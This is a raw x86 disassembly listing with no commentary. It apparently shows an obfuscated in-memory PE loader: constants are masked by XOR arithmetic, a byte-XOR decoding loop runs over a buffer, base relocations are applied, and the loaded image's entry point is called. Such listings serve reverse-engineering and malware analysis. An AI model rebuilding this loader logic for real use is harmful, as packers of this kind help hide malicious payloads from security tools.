  41df8c:	mov    eax,DWORD PTR [ebp-0x28]
  41df8f:	mov    ecx,DWORD PTR [ebp-0x38]
  41df92:	xor    eax,ebx
  41df94:	add    eax,esi
  41df96:	cmp    ecx,eax
  41df98:	je     0x41e18e
  41df9e:	jmp    0x41e16a
  41dfa3:	mov    ecx,DWORD PTR [ebp-0xc]
  41dfa6:	mov    eax,DWORD PTR [ebp-0x38]
  41dfa9:	sub    eax,ecx
  41dfab:	mov    ecx,DWORD PTR [ebp-0x48]
  41dfae:	xor    ecx,ebx
  41dfb0:	add    ecx,esi
  41dfb2:	xor    edx,edx
  41dfb4:	div    ecx
  41dfb6:	mov    DWORD PTR [ebp-0x10],eax
  41dfb9:	mov    eax,DWORD PTR [ebp-0x24]
  41dfbc:	mov    ecx,DWORD PTR [ebp-0x10]
  41dfbf:	xor    eax,ebx
  41dfc1:	add    eax,esi
  41dfc3:	cmp    ecx,eax
  41dfc5:	jbe    0x41dfd1
  41dfc7:	mov    eax,DWORD PTR [ebp-0x24]
  41dfca:	xor    eax,ebx
  41dfcc:	add    eax,esi
  41dfce:	mov    DWORD PTR [ebp-0x10],eax
  41dfd1:	mov    eax,DWORD PTR [ebp-0x48]
  41dfd4:	mov    ecx,DWORD PTR [ebp-0x10]
  41dfd7:	xor    eax,ebx
  41dfd9:	add    eax,esi
  41dfdb:	imul   eax,ecx
  41dfde:	mov    DWORD PTR [ebp-0x10],eax
  41dfe1:	mov    eax,DWORD PTR [ebp-0x28]
  41dfe4:	mov    ecx,DWORD PTR [ebp-0x10]
  41dfe7:	xor    eax,ebx
  41dfe9:	add    eax,esi
  41dfeb:	cmp    ecx,eax
  41dfed:	je     0x41e158
  41dff3:	mov    eax,DWORD PTR [ebp-0x10]
  41dff6:	mov    DWORD PTR [ebp-0x20],eax
  41dff9:	mov    eax,DWORD PTR [ebp-0xc]
  41dffc:	add    eax,DWORD PTR [ebp-0x40]
  41dfff:	mov    DWORD PTR [ebp-0x54],0xf89c8585
  41e006:	mov    DWORD PTR [ebp-0x10],edi
  41e009:	mov    DWORD PTR [ebp-0x4c],0xf89c85bb
  41e010:	mov    DWORD PTR [ebp-0x1c],eax
  41e013:	mov    DWORD PTR [ebp-0x34],0xf89c85ba
  41e01a:	mov    DWORD PTR [ebp-0x8],edi
  41e01d:	mov    eax,DWORD PTR [ebp-0x54]
  41e020:	xor    eax,ebx
  41e022:	add    eax,esi
  41e024:	jmp    0x41e117
  41e029:	mov    DWORD PTR [ebp-0xac],0xf89c85b3
  41e033:	mov    DWORD PTR [ebp-0x9c],0xf89c85a9
  41e03d:	mov    eax,DWORD PTR [ebp-0x8]
  41e040:	mov    ecx,DWORD PTR [ebp-0x18]
  41e043:	xor    eax,ebx
  41e045:	add    eax,esi
  41e047:	imul   eax,ecx
  41e04a:	mov    ecx,DWORD PTR [ebp-0x1c]
  41e04d:	mov    al,BYTE PTR [eax+ecx*1]
  41e050:	mov    BYTE PTR [ebp-0x1],al
  41e053:	mov    eax,DWORD PTR [ebp-0x8]
  41e056:	mov    ecx,DWORD PTR [ebp-0x18]
  41e059:	xor    eax,ebx
  41e05b:	add    eax,esi
  41e05d:	imul   eax,ecx
  41e060:	mov    ecx,DWORD PTR [ebp-0x4c]
  41e063:	xor    ecx,ebx
  41e065:	add    eax,ecx
  41e067:	mov    ecx,DWORD PTR [ebp-0x1c]
  41e06a:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272e2]
  41e072:	mov    ecx,DWORD PTR [ebp-0xac]
  41e078:	xor    ecx,ebx
  41e07a:	lea    eax,[ecx+eax*1+0x3272e2]
  41e081:	movzx  ecx,BYTE PTR [ebp-0x1]
  41e085:	xor    ecx,eax
  41e087:	mov    BYTE PTR [ebp-0x1],cl
  41e08a:	mov    al,BYTE PTR [ebp-0x1]
  41e08d:	mov    ecx,DWORD PTR [ebp-0x8]
  41e090:	mov    edx,DWORD PTR [ebp-0x18]
  41e093:	xor    ecx,ebx
  41e095:	add    ecx,esi
  41e097:	imul   ecx,edx
  41e09a:	mov    edx,DWORD PTR [ebp-0x1c]
  41e09d:	mov    BYTE PTR [ecx+edx*1],al
  41e0a0:	mov    eax,DWORD PTR [ebp-0x8]
  41e0a3:	mov    ecx,DWORD PTR [ebp-0x18]
  41e0a6:	xor    eax,ebx
  41e0a8:	add    eax,esi
  41e0aa:	imul   eax,ecx
  41e0ad:	mov    ecx,DWORD PTR [ebp-0x1c]
  41e0b0:	mov    al,BYTE PTR [eax+ecx*1]
  41e0b3:	mov    BYTE PTR [ebp-0x1],al
  41e0b6:	mov    eax,DWORD PTR [ebp-0x8]
  41e0b9:	mov    ecx,DWORD PTR [ebp-0x18]
  41e0bc:	xor    eax,ebx
  41e0be:	add    eax,esi
  41e0c0:	imul   eax,ecx
  41e0c3:	mov    ecx,DWORD PTR [ebp-0x10]
  41e0c6:	xor    ecx,ebx
  41e0c8:	add    eax,ecx
  41e0ca:	mov    ecx,DWORD PTR [ebp-0x1c]
  41e0cd:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272e2]
  41e0d5:	mov    ecx,DWORD PTR [ebp-0x9c]
  41e0db:	xor    ecx,ebx
  41e0dd:	lea    eax,[ecx+eax*1+0x3272e2]
  41e0e4:	movzx  ecx,BYTE PTR [ebp-0x1]
  41e0e8:	xor    ecx,eax
  41e0ea:	mov    BYTE PTR [ebp-0x1],cl
  41e0ed:	mov    al,BYTE PTR [ebp-0x1]
  41e0f0:	mov    ecx,DWORD PTR [ebp-0x8]
  41e0f3:	mov    edx,DWORD PTR [ebp-0x18]
  41e0f6:	xor    ecx,ebx
  41e0f8:	add    ecx,esi
  41e0fa:	imul   ecx,edx
  41e0fd:	mov    edx,DWORD PTR [ebp-0x1c]
  41e100:	mov    BYTE PTR [ecx+edx*1],al
  41e103:	mov    eax,DWORD PTR [ebp-0x34]
  41e106:	mov    ecx,DWORD PTR [ebp-0x10]
  41e109:	xor    eax,ebx
  41e10b:	xor    ecx,ebx
  41e10d:	add    eax,esi
  41e10f:	add    ecx,esi
  41e111:	imul   eax,ecx
  41e114:	add    eax,DWORD PTR [ebp-0x18]
  41e117:	mov    DWORD PTR [ebp-0x18],eax
  41e11a:	mov    eax,DWORD PTR [ebp-0x18]
  41e11d:	mov    ecx,DWORD PTR [ebp-0x20]
  41e120:	cmp    ecx,eax
  41e122:	jb     0x41e029
  41e128:	mov    eax,DWORD PTR [ebp-0x10]
  41e12b:	mov    ecx,DWORD PTR [ebp-0x20]
  41e12e:	xor    eax,ebx
  41e130:	add    eax,esi
  41e132:	imul   eax,ecx
  41e135:	mov    ecx,DWORD PTR [ebp-0x54]
  41e138:	xor    ecx,ebx
  41e13a:	add    ecx,esi
  41e13c:	or     eax,ecx
  41e13e:	mov    ecx,DWORD PTR [ebp-0x30]
  41e141:	xor    ecx,ebx
  41e143:	add    eax,ecx
  41e145:	mov    ecx,DWORD PTR [ebp-0x30]
  41e148:	xor    ecx,ebx
  41e14a:	add    eax,ecx
  41e14c:	mov    ecx,DWORD PTR [ebp-0xc]
  41e14f:	lea    eax,[eax+ecx*1+0x64e5c4]
  41e156:	jmp    0x41e167
  41e158:	mov    eax,DWORD PTR [ebp-0x30]
  41e15b:	mov    ecx,DWORD PTR [ebp-0xc]
  41e15e:	xor    eax,ebx
  41e160:	lea    eax,[eax+ecx*1+0x3272e2]
  41e167:	mov    DWORD PTR [ebp-0xc],eax
  41e16a:	mov    eax,DWORD PTR [ebp-0x30]
  41e16d:	xor    eax,ebx
  41e16f:	mov    ecx,0xffcd8d1e
  41e174:	sub    ecx,eax
  41e176:	add    ecx,DWORD PTR [ebp-0x38]
  41e179:	mov    eax,DWORD PTR [ebp-0x30]
  41e17c:	mov    edx,DWORD PTR [ebp-0xc]
  41e17f:	xor    eax,ebx
  41e181:	add    eax,esi
  41e183:	imul   eax,edx
  41e186:	cmp    eax,ecx
  41e188:	jbe    0x41dfa3
  41e18e:	push   DWORD PTR [ebp+0x8]
  41e191:	mov    eax,DWORD PTR [ebp+0x8]
  41e194:	push   DWORD PTR [eax+0x1cc]
  41e19a:	lea    eax,[ebp-0xa0]
  41e1a0:	push   eax
  41e1a1:	mov    eax,DWORD PTR [ebp+0x8]
  41e1a4:	mov    eax,DWORD PTR [eax+0x1c4]
  41e1aa:	push   DWORD PTR [eax]
  41e1ac:	mov    eax,DWORD PTR [ebp+0x8]
  41e1af:	mov    eax,DWORD PTR [eax+0x1c0]
  41e1b5:	push   DWORD PTR [eax]
  41e1b7:	push   DWORD PTR [ebp-0x3c]
  41e1ba:	push   DWORD PTR [ebp-0x2c]
  41e1bd:	call   0x41ec54
  41e1c2:	mov    DWORD PTR [ebp-0x40],eax
  41e1c5:	mov    eax,DWORD PTR [ebp-0x14]
  41e1c8:	mov    ecx,DWORD PTR [ebp-0x2c]
  41e1cb:	xor    eax,ebx
  41e1cd:	add    eax,esi
  41e1cf:	cmp    eax,ecx
  41e1d1:	je     0x41e1f2
  41e1d3:	mov    eax,DWORD PTR [ebp+0x8]
  41e1d6:	mov    ecx,DWORD PTR [ebp-0x50]
  41e1d9:	mov    eax,DWORD PTR [eax+0x1d8]
  41e1df:	xor    ecx,ebx
  41e1e1:	add    ecx,esi
  41e1e3:	push   ecx
  41e1e4:	mov    ecx,DWORD PTR [ebp-0x14]
  41e1e7:	xor    ecx,ebx
  41e1e9:	add    ecx,esi
  41e1eb:	push   ecx
  41e1ec:	push   DWORD PTR [ebp-0x2c]
  41e1ef:	call   DWORD PTR [eax+0x18]
  41e1f2:	pop    edi
  41e1f3:	pop    esi
  41e1f4:	pop    ebx
  41e1f5:	leave  
  41e1f6:	ret    0x4
  41e1f9:	push   ebp
  41e1fa:	mov    ebp,esp
  41e1fc:	push   ecx
  41e1fd:	push   ecx
  41e1fe:	lea    eax,[ebp-0x8]
  41e201:	mov    DWORD PTR [ebp-0x4],eax
  41e204:	push   esi
  41e205:	mov    esi,DWORD PTR [ebp-0x4]
  41e208:	mov    eax,0xf881ba0f
  41e20d:	mov    DWORD PTR [esi],eax
  41e20f:	mov    esi,DWORD PTR [ebp-0x8]
  41e212:	cmp    esi,eax
  41e214:	pop    esi
  41e215:	jne    0x41e21f
  41e217:	mov    BYTE PTR [ecx+0xa],0x7c
  41e21b:	mov    BYTE PTR [edx+0x8],0x2f
  41e21f:	mov    BYTE PTR [edx+0xa],0x7c
  41e223:	mov    BYTE PTR [ecx+0x2],0x2
  41e227:	leave  
  41e228:	ret    
  41e229:	push   ebp
  41e22a:	mov    ebp,esp
  41e22c:	push   ecx
  41e22d:	push   ecx
  41e22e:	lea    eax,[ebp-0x8]
  41e231:	mov    DWORD PTR [ebp-0x4],eax
  41e234:	mov    edx,DWORD PTR [ebp-0x4]
  41e237:	mov    eax,0xf88b0be3
  41e23c:	mov    DWORD PTR [edx],eax
  41e23e:	mov    edx,DWORD PTR [ebp-0x8]
  41e241:	cmp    edx,eax
  41e243:	jne    0x41e254
  41e245:	mov    eax,DWORD PTR [ebp+0x8]
  41e248:	mov    BYTE PTR [ecx+0x9],0x8
  41e24c:	mov    BYTE PTR [eax+0x7],0x47
  41e250:	mov    BYTE PTR [ecx+0x6],0xf
  41e254:	mov    BYTE PTR [ecx+0x3],0x18
  41e258:	leave  
  41e259:	ret    0x4
  41e25c:	push   ebp
  41e25d:	mov    ebp,esp
  41e25f:	push   ecx
  41e260:	push   ecx
  41e261:	lea    eax,[ebp-0x8]
  41e264:	mov    DWORD PTR [ebp-0x4],eax
  41e267:	mov    edx,DWORD PTR [ebp-0x4]
  41e26a:	mov    eax,0x7e0da0f
  41e26f:	mov    DWORD PTR [edx],eax
  41e271:	mov    edx,DWORD PTR [ebp-0x8]
  41e274:	cmp    edx,eax
  41e276:	jne    0x41e27c
  41e278:	mov    BYTE PTR [ecx+0x7],0x47
  41e27c:	mov    eax,DWORD PTR [ebp+0x8]
  41e27f:	mov    BYTE PTR [ecx+0x1],0x5
  41e283:	mov    BYTE PTR [eax+0x9],0x28
  41e287:	leave  
  41e288:	ret    0x4
  41e28b:	push   ebp
  41e28c:	mov    ebp,esp
  41e28e:	push   ecx
  41e28f:	push   ecx
  41e290:	lea    eax,[ebp-0x8]
  41e293:	mov    DWORD PTR [ebp-0x4],eax
  41e296:	push   esi
  41e297:	mov    esi,DWORD PTR [ebp-0x4]
  41e29a:	mov    eax,0x7060e3e
  41e29f:	mov    DWORD PTR [esi],eax
  41e2a1:	mov    esi,DWORD PTR [ebp-0x8]
  41e2a4:	cmp    esi,eax
  41e2a6:	pop    esi
  41e2a7:	jne    0x41e2b3
  41e2a9:	mov    BYTE PTR [edx+0x4],0x3
  41e2ad:	mov    WORD PTR [ecx+0x3],0x318
  41e2b3:	mov    BYTE PTR [edx],0x3f
  41e2b6:	leave  
  41e2b7:	ret    
  41e2b8:	push   ebp
  41e2b9:	mov    ebp,esp
  41e2bb:	push   ecx
  41e2bc:	push   ecx
  41e2bd:	lea    eax,[ebp-0x8]
  41e2c0:	mov    DWORD PTR [ebp-0x4],eax
  41e2c3:	mov    edx,DWORD PTR [ebp-0x4]
  41e2c6:	mov    eax,0xf8870b3f
  41e2cb:	mov    DWORD PTR [edx],eax
  41e2cd:	mov    edx,DWORD PTR [ebp-0x8]
  41e2d0:	cmp    edx,eax
  41e2d2:	jne    0x41e2df
  41e2d4:	mov    eax,DWORD PTR [ebp+0x8]
  41e2d7:	mov    BYTE PTR [ecx+0x8],0xf
  41e2db:	mov    BYTE PTR [eax+0x1],0x5
  41e2df:	mov    BYTE PTR [ecx+0x5],0xb
  41e2e3:	leave  
  41e2e4:	ret    0x4
  41e2e7:	push   esi
  41e2e8:	mov    ecx,edi
  41e2ea:	call   0x41e2b8
  41e2ef:	mov    edx,edi
  41e2f1:	mov    ecx,esi
  41e2f3:	mov    BYTE PTR [esi],0x1f
  41e2f6:	call   0x41e28b
  41e2fb:	push   esi
  41e2fc:	mov    ecx,edi
  41e2fe:	mov    BYTE PTR [esi+0x5],0xb
  41e302:	call   0x41e25c
  41e307:	push   esi
  41e308:	mov    BYTE PTR [esi+0x6],0xf
  41e30c:	call   0x41e229
  41e311:	mov    BYTE PTR [esi+0x2],0x2
  41e315:	mov    edx,esi
  41e317:	jmp    0x41e1f9
  41e31c:	push   ebp
  41e31d:	mov    ebp,esp
  41e31f:	push   ecx
  41e320:	mov    ecx,DWORD PTR [edx+0x194]
  41e326:	push   esi
  41e327:	mov    esi,DWORD PTR [ebp+0x8]
  41e32a:	mov    esi,DWORD PTR [esi]
  41e32c:	mov    DWORD PTR [ecx],esi
  41e32e:	mov    ecx,DWORD PTR [edx+0x194]
  41e334:	mov    ecx,DWORD PTR [ecx]
  41e336:	mov    esi,DWORD PTR [edx+0x190]
  41e33c:	mov    DWORD PTR [esi],ecx
  41e33e:	mov    eax,DWORD PTR [edx+0x194]
  41e344:	mov    ecx,DWORD PTR [eax]
  41e346:	mov    ecx,DWORD PTR [ecx+0x3c]
  41e349:	add    ecx,DWORD PTR [eax]
  41e34b:	mov    DWORD PTR [ebp-0x4],0xf89ca585
  41e352:	mov    eax,DWORD PTR [ebp-0x4]
  41e355:	movzx  ecx,WORD PTR [ecx+0x16]
  41e359:	xor    eax,0x751089b
  41e35e:	add    eax,0x3272e2
  41e363:	pop    esi
  41e364:	test   ecx,eax
  41e366:	je     0x41e374
  41e368:	mov    eax,DWORD PTR [edx+0x1c8]
  41e36e:	mov    DWORD PTR [eax],0xf89c8584
  41e374:	leave  
  41e375:	ret    0x4
  41e378:	push   ebp
  41e379:	mov    ebp,esp
  41e37b:	sub    esp,0x70
  41e37e:	and    DWORD PTR [ebp-0x20],0x0
  41e382:	mov    DWORD PTR [ebp-0x18],0xf89cb585
  41e389:	mov    DWORD PTR [ebp-0x1c],0xf89c85c5
  41e390:	mov    DWORD PTR [ebp-0x2c],0xf89c85b9
  41e397:	mov    DWORD PTR [ebp-0x14],0xf89c85bb
  41e39e:	mov    DWORD PTR [ebp-0x2c],0xf89f0585
  41e3a5:	mov    eax,DWORD PTR [ebp+0x20]
  41e3a8:	mov    eax,DWORD PTR [eax+0x194]
  41e3ae:	mov    DWORD PTR [ebp-0xc],eax
  41e3b1:	mov    eax,DWORD PTR [ebp+0x20]
  41e3b4:	push   ebx
  41e3b5:	push   esi
  41e3b6:	mov    esi,DWORD PTR [eax+0x190]
  41e3bc:	mov    eax,DWORD PTR [ebp+0x20]
  41e3bf:	mov    eax,DWORD PTR [eax+0x18c]
  41e3c5:	mov    DWORD PTR [ebp-0x8],eax
  41e3c8:	mov    eax,DWORD PTR [eax]
  41e3ca:	push   edi
  41e3cb:	mov    DWORD PTR [ebp-0x4],esi
  41e3ce:	test   eax,eax
  41e3d0:	jne    0x41e3dd
  41e3d2:	push   DWORD PTR [ebp+0x1c]
  41e3d5:	mov    edx,DWORD PTR [ebp+0x20]
  41e3d8:	call   0x41e31c
  41e3dd:	mov    eax,DWORD PTR [esi]
  41e3df:	mov    ebx,DWORD PTR [esi]
  41e3e1:	add    ebx,DWORD PTR [eax+0x3c]
  41e3e4:	mov    eax,DWORD PTR [ebp+0xc]
  41e3e7:	mov    ecx,DWORD PTR [ebp-0x8]
  41e3ea:	mov    ecx,DWORD PTR [ecx]
  41e3ec:	mov    esi,0x751089b
  41e3f1:	xor    eax,esi
  41e3f3:	mov    edi,0x3272e2
  41e3f8:	add    eax,edi
  41e3fa:	cmp    eax,ecx
  41e3fc:	jne    0x41e634
  41e402:	mov    eax,DWORD PTR [ebp-0xc]
  41e405:	mov    eax,DWORD PTR [eax]
  41e407:	mov    DWORD PTR [ebp-0x10],eax
  41e40a:	mov    eax,DWORD PTR [ebx+0x50]
  41e40d:	mov    DWORD PTR [ebp-0x68],eax
  41e410:	mov    eax,DWORD PTR [ebp-0x18]
  41e413:	xor    eax,esi
  41e415:	add    eax,edi
  41e417:	mov    DWORD PTR [ebp-0x64],eax
  41e41a:	mov    eax,DWORD PTR [ebp-0x14]
  41e41d:	and    DWORD PTR [ebp-0x6c],0x0
  41e421:	xor    eax,esi
  41e423:	add    eax,edi
  41e425:	mov    DWORD PTR [ebp-0x60],eax
  41e428:	lea    eax,[ebp-0x70]
  41e42b:	push   eax
  41e42c:	mov    eax,DWORD PTR [ebp+0x8]
  41e42f:	xor    eax,esi
  41e431:	add    eax,edi
  41e433:	push   eax
  41e434:	mov    eax,DWORD PTR [ebp+0x20]
  41e437:	add    eax,0xaa
  41e43c:	push   eax
  41e43d:	mov    eax,DWORD PTR [ebp+0x20]
  41e440:	mov    eax,DWORD PTR [eax+0x198]
  41e446:	mov    DWORD PTR [ebp-0x70],0x4
  41e44d:	push   DWORD PTR [eax]
  41e44f:	mov    eax,DWORD PTR [ebp+0x10]
  41e452:	call   eax
  41e454:	mov    ecx,DWORD PTR [ebp-0xc]
  41e457:	mov    ecx,DWORD PTR [ecx]
  41e459:	mov    edx,DWORD PTR [ebp-0x8]
  41e45c:	mov    DWORD PTR [ebp-0x6c],eax
  41e45f:	mov    DWORD PTR [ebp+0x1c],eax
  41e462:	mov    DWORD PTR [edx],ecx
  41e464:	mov    ecx,DWORD PTR [ebp-0x4]
  41e467:	mov    DWORD PTR [ecx],eax
  41e469:	mov    eax,DWORD PTR [ebx+0x50]
  41e46c:	mov    DWORD PTR [ebp-0x68],eax
  41e46f:	mov    eax,DWORD PTR [ebp-0x1c]
  41e472:	xor    eax,esi
  41e474:	add    eax,edi
  41e476:	mov    DWORD PTR [ebp-0x64],eax
  41e479:	lea    eax,[ebp-0x20]
  41e47c:	mov    DWORD PTR [ebp-0x60],eax
  41e47f:	lea    eax,[ebp-0x70]
  41e482:	push   eax
  41e483:	mov    eax,DWORD PTR [ebp+0x8]
  41e486:	xor    eax,esi
  41e488:	add    eax,edi
  41e48a:	push   eax
  41e48b:	mov    eax,DWORD PTR [ebp+0x20]
  41e48e:	add    eax,0xee
  41e493:	push   eax
  41e494:	mov    eax,DWORD PTR [ebp+0x20]
  41e497:	mov    eax,DWORD PTR [eax+0x198]
  41e49d:	mov    DWORD PTR [ebp-0x70],0x4
  41e4a4:	push   DWORD PTR [eax]
  41e4a6:	mov    eax,DWORD PTR [ebp+0x10]
  41e4a9:	call   eax
  41e4ab:	test   eax,eax
  41e4ad:	je     0x41e4d2
  41e4af:	and    DWORD PTR [ebp+0xc],0x0
  41e4b3:	cmp    DWORD PTR [ebx+0x50],0x0
  41e4b7:	jbe    0x41e4d2
  41e4b9:	mov    eax,DWORD PTR [ebp+0x1c]
  41e4bc:	mov    ecx,DWORD PTR [ebp-0x10]
  41e4bf:	sub    ecx,eax
  41e4c1:	mov    dl,BYTE PTR [ecx+eax*1]
  41e4c4:	inc    DWORD PTR [ebp+0xc]
  41e4c7:	mov    BYTE PTR [eax],dl
  41e4c9:	mov    edx,DWORD PTR [ebp+0xc]
  41e4cc:	inc    eax
  41e4cd:	cmp    edx,DWORD PTR [ebx+0x50]
  41e4d0:	jb     0x41e4c1
  41e4d2:	mov    edx,DWORD PTR [ebp+0x1c]
  41e4d5:	mov    ecx,DWORD PTR [edx+0x3c]
  41e4d8:	add    ecx,edx
  41e4da:	mov    eax,DWORD PTR [ecx+0xa0]
  41e4e0:	mov    ebx,DWORD PTR [ecx+0x28]
  41e4e3:	add    eax,edx
  41e4e5:	sub    edx,DWORD PTR [ebp-0x10]
  41e4e8:	add    ebx,DWORD PTR [ebp+0x1c]
  41e4eb:	mov    DWORD PTR [ebp+0xc],edx
  41e4ee:	mov    DWORD PTR [ebp-0x2c],ecx
  41e4f1:	mov    DWORD PTR [ebp-0x14],ebx
  41e4f4:	mov    DWORD PTR [ebp-0x8],0x0
  41e4fb:	jmp    0x41e577
  41e4fd:	add    edx,0xfffffff8
  41e500:	shr    edx,1
  41e502:	mov    DWORD PTR [ebp-0x18],edx
  41e505:	je     0x41e563
  41e507:	lea    edx,[eax+0x8]
  41e50a:	mov    DWORD PTR [ebp-0x4],edx
  41e50d:	mov    edx,DWORD PTR [ebp-0x18]
  41e510:	mov    DWORD PTR [ebp-0x18],edx
  41e513:	mov    edx,DWORD PTR [ebp-0x4]
  41e516:	movzx  edx,WORD PTR [edx]
  41e519:	mov    DWORD PTR [ebp-0x24],edx
  41e51c:	and    edx,0xfff
  41e522:	mov    DWORD PTR [ebp-0x28],edx
  41e525:	mov    edx,DWORD PTR [ebp-0x24]
  41e528:	shr    edx,0xc
  41e52b:	add    edx,0xffcd8d1e
  41e531:	xor    edx,esi
  41e533:	cmp    edx,0xf89c85ba
  41e539:	jne    0x41e55a
  41e53b:	mov    edx,DWORD PTR [ebp-0x28]
  41e53e:	add    edx,DWORD PTR [ebp+0x1c]
  41e541:	mov    ebx,DWORD PTR [eax]
  41e543:	cmp    DWORD PTR [ebx+edx*1],0x0
  41e547:	je     0x41e557
  41e549:	mov    ecx,DWORD PTR [ebp+0xc]
  41e54c:	add    ecx,DWORD PTR [ebx+edx*1]
  41e54f:	mov    ebx,DWORD PTR [eax]
  41e551:	mov    DWORD PTR [edx+ebx*1],ecx
  41e554:	mov    ecx,DWORD PTR [ebp-0x2c]
  41e557:	mov    ebx,DWORD PTR [ebp-0x14]
  41e55a:	add    DWORD PTR [ebp-0x4],0x2
  41e55e:	dec    DWORD PTR [ebp-0x18]
  41e561:	jne    0x41e513
  41e563:	mov    edx,DWORD PTR [ebp-0xc]
  41e566:	add    DWORD PTR [ebp-0x8],edx
  41e569:	mov    edx,DWORD PTR [ebp-0x8]
  41e56c:	cmp    edx,DWORD PTR [ecx+0xa4]
  41e572:	jae    0x41e585
  41e574:	add    eax,DWORD PTR [ebp-0xc]
  41e577:	mov    edx,DWORD PTR [eax+0x4]
  41e57a:	mov    DWORD PTR [ebp-0xc],edx
  41e57d:	test   edx,edx
  41e57f:	jne    0x41e4fd
  41e585:	mov    eax,DWORD PTR [ebp-0x10]
  41e588:	mov    DWORD PTR [ebp-0x6c],eax
  41e58b:	mov    DWORD PTR [ebp-0x70],0x4
  41e592:	mov    eax,DWORD PTR [ecx+0x50]
  41e595:	mov    DWORD PTR [ebp-0x68],eax
  41e598:	mov    eax,DWORD PTR [ebp-0x1c]
  41e59b:	xor    eax,esi
  41e59d:	add    eax,edi
  41e59f:	mov    DWORD PTR [ebp-0x64],eax
  41e5a2:	lea    eax,[ebp-0x20]
  41e5a5:	mov    DWORD PTR [ebp-0x60],eax
  41e5a8:	lea    eax,[ebp-0x70]
  41e5ab:	push   eax
  41e5ac:	mov    eax,DWORD PTR [ebp+0x8]
  41e5af:	xor    eax,esi
  41e5b1:	add    eax,edi
  41e5b3:	push   eax
  41e5b4:	mov    eax,DWORD PTR [ebp+0x20]
  41e5b7:	add    eax,0xee
  41e5bc:	push   eax
  41e5bd:	mov    eax,DWORD PTR [ebp+0x20]
  41e5c0:	mov    eax,DWORD PTR [eax+0x198]
  41e5c6:	push   DWORD PTR [eax]
  41e5c8:	mov    eax,DWORD PTR [ebp+0x10]
  41e5cb:	call   eax
  41e5cd:	mov    eax,DWORD PTR [ebp+0x20]
  41e5d0:	mov    eax,DWORD PTR [eax+0x180]
  41e5d6:	add    eax,DWORD PTR [ebp+0xc]
  41e5d9:	mov    ecx,DWORD PTR [ebp+0xc]
  41e5dc:	push   DWORD PTR [ebp+0x18]
  41e5df:	mov    DWORD PTR [eax],ecx
  41e5e1:	push   DWORD PTR [ebp+0x14]
  41e5e4:	push   DWORD PTR [ebp+0x1c]
  41e5e7:	call   ebx
  41e5e9:	mov    ecx,DWORD PTR [ebp+0xc]
  41e5ec:	add    ecx,DWORD PTR [ebp+0x20]
  41e5ef:	lea    eax,[ebp+0x4]
  41e5f2:	mov    DWORD PTR [ebp+0x20],ecx
  41e5f5:	mov    ecx,DWORD PTR [ebp+0x20]
  41e5f8:	mov    ecx,DWORD PTR [ebp+0x20]
  41e5fb:	mov    edx,DWORD PTR [ecx+0x190]
  41e601:	mov    ecx,DWORD PTR [ebp+0x20]
  41e604:	mov    ecx,DWORD PTR [ecx+0x18c]
  41e60a:	mov    esi,DWORD PTR [ecx]
  41e60c:	cmp    DWORD PTR [eax],esi
  41e60e:	jb     0x41e62f
  41e610:	mov    esi,DWORD PTR [edx]
  41e612:	mov    edi,DWORD PTR [edx]
  41e614:	mov    esi,DWORD PTR [esi+0x3c]
  41e617:	lea    esi,[edi+esi*1+0x50]
  41e61b:	mov    edi,DWORD PTR [ecx]
  41e61d:	add    edi,DWORD PTR [esi]
  41e61f:	cmp    DWORD PTR [eax],edi
  41e621:	jae    0x41e62f
  41e623:	mov    esi,DWORD PTR [ecx]
  41e625:	mov    ecx,DWORD PTR [eax]
  41e627:	mov    edx,DWORD PTR [edx]
  41e629:	sub    ecx,esi
  41e62b:	add    edx,ecx
  41e62d:	mov    DWORD PTR [eax],edx
  41e62f:	mov    eax,DWORD PTR [ebp+0xc]
  41e632:	jmp    0x41e636
  41e634:	xor    eax,eax
  41e636:	pop    edi
  41e637:	pop    esi
  41e638:	pop    ebx
  41e639:	leave  
  41e63a:	ret    0x1c
  41e63d:	push   ebp
  41e63e:	mov    ebp,esp
  41e640:	sub    esp,0x1c
  41e643:	push   esi
  41e644:	mov    esi,eax
  41e646:	mov    eax,DWORD PTR [ecx+0x190]
  41e64c:	cmp    DWORD PTR [eax],0x0
  41e64f:	je     0x41e75f
  41e655:	test   edx,edx
  41e657:	je     0x41e75f
  41e65d:	test   esi,esi
  41e65f:	je     0x41e75f
  41e665:	mov    eax,DWORD PTR [esi+0x88]
  41e66b:	test   eax,eax
  41e66d:	je     0x41e75a
  41e673:	cmp    DWORD PTR [esi+0x8c],0x10
  41e67a:	je     0x41e75a
  41e680:	cmp    DWORD PTR [esi+0x34],edx
  41e683:	je     0x41e75a
  41e689:	mov    esi,DWORD PTR [ecx+0x18c]
  41e68f:	and    DWORD PTR [ebp-0x10],0x0
  41e693:	mov    ecx,edx
  41e695:	sub    ecx,DWORD PTR [esi]
  41e697:	add    eax,edx
  41e699:	movzx  edx,WORD PTR [eax+0xc]
  41e69d:	mov    DWORD PTR [ebp-0x1c],ecx
  41e6a0:	movzx  ecx,WORD PTR [eax+0xe]
  41e6a4:	add    ecx,edx
  41e6a6:	je     0x41e75a
  41e6ac:	lea    ecx,[eax+0x14]
  41e6af:	push   ebx
  41e6b0:	mov    DWORD PTR [ebp-0x18],ecx
  41e6b3:	mov    esi,0x7fffffff
  41e6b8:	push   edi
  41e6b9:	test   DWORD PTR [ecx],esi
  41e6bb:	je     0x41e73c
  41e6bd:	mov    edx,DWORD PTR [ecx]
  41e6bf:	and    DWORD PTR [ebp-0xc],0x0
  41e6c3:	and    edx,esi
  41e6c5:	add    edx,eax
  41e6c7:	movzx  edi,WORD PTR [edx+0xe]
  41e6cb:	movzx  ebx,WORD PTR [edx+0xc]
  41e6cf:	add    edi,ebx
  41e6d1:	je     0x41e73c
  41e6d3:	lea    ecx,[edx+0x14]
  41e6d6:	mov    DWORD PTR [ebp-0x14],ecx
  41e6d9:	test   DWORD PTR [ecx],esi
  41e6db:	je     0x41e71e
  41e6dd:	mov    ecx,DWORD PTR [ecx]
  41e6df:	and    DWORD PTR [ebp-0x8],0x0
  41e6e3:	and    ecx,esi
  41e6e5:	add    ecx,eax
  41e6e7:	movzx  edi,WORD PTR [ecx+0xe]
  41e6eb:	movzx  ebx,WORD PTR [ecx+0xc]
  41e6ef:	add    edi,ebx
  41e6f1:	je     0x41e71e
  41e6f3:	lea    edi,[ecx+0x14]
  41e6f6:	mov    DWORD PTR [ebp-0x4],edi
  41e6f9:	mov    edi,DWORD PTR [ebp-0x4]
  41e6fc:	mov    edi,DWORD PTR [edi]
  41e6fe:	test   edi,edi
  41e700:	je     0x41e708
  41e702:	mov    ebx,DWORD PTR [ebp-0x1c]
